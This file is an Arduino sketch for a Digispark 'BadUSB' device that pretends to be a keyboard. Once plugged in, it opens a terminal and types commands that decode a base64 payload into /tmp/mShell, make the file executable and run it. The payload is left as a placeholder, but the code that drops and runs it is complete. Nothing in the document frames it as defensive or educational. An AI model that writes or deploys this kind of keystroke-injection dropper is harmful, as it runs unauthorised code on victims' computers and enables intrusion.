#include "DigiKeyboard.h"

void setup() {
DigiKeyboard.sendKeyStroke(0); 
delay(200);
DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT); 
delay(300);

DigiKeyboard.print("terminal"); // Program to run
delay(1000);

DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
// Delay for 1 second, if terminal is not opened, part of the string below is wasted to /dev/null
delay(1000);
DigiKeyboard.print("echo Base64_goes_here/+E= | base64 --decode > /tmp/mShell");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);

DigiKeyboard.println("chmod 755 /tmp/mShell");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(200);
DigiKeyboard.println("/tmp/mShell");
DigiKeyboard.sendKeyStroke(KEY_ENTER);

DigiKeyboard.delay(100);

}

void loop() {
//left deliberately empty
}
